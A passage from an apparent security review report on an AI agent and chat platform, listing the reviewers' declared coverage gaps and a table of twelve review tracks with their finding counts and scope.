- Coverage gaps the reviewers declared: the bulk of the roughly 190 connector tool handlers were sampled rather than read line by line; about 1,700 lines of the agents engine (sub-agent runner, compaction, notifier) and the chart and crawl page scripts were skimmed; `apps/worker-delegate/src/grants.ts` and `onbase-worker.ts` were read for control points only; the memory-store twins of the Postgres methods were spot-checked.
- Whether a project viewer-role collaborator can reach the `code_*` MCP tools through a chat in a project they only read was raised by the sandbox track and not fully traced; it is worth a follow-up.

## Appendix A. Review tracks and their notes

| Track | Prefix | Scope summary |
| --- | --- | --- |
| Authentication, sessions, OIDC, setup, roles | AUTH | 13 findings; hand-verified operator gating on 105 admin files |
| MCP gateway and OAuth 2.1 server | MCP | 12 findings; probed redirect-URI validation |
| Chat, projects, artifacts, sharing | CHAT | 10 findings; full table of 58 routes plus the upload route |
| Agents, approvals, batch, notifications, logs | AGENT | 12 findings; table of 67 routes |
| Sandbox worker and code projects | SBX | 6 findings; ran the egress guard against alternate IP spellings |
| Cryptography, keys, delegate, grants | CRYPTO | 10 findings; threat matrix of what each key holder can read |
| Connectors, egress, connect flows, workers | CONN | 14 findings; URL-sink table of every outbound destination |
| Unauthenticated surface and webhooks | WEB | 9 findings; reproduced the limiter flaw; per-webhook verification table |
| Deployment, images, CI, supply chain, configuration | DEPLOY | 16 findings; table of about 45 environment variables; 30-row discrepancy table |
| Data layer, gates, parsers, QuickJS | DATA | 12 findings; table of every dynamic SQL site |
| Browser-side rendering | XSS | 10 findings; rendering-sink table |
| Dependencies and base images | CVE | 9 findings; inventory of npm packages, base images and the sandbox toolchain |
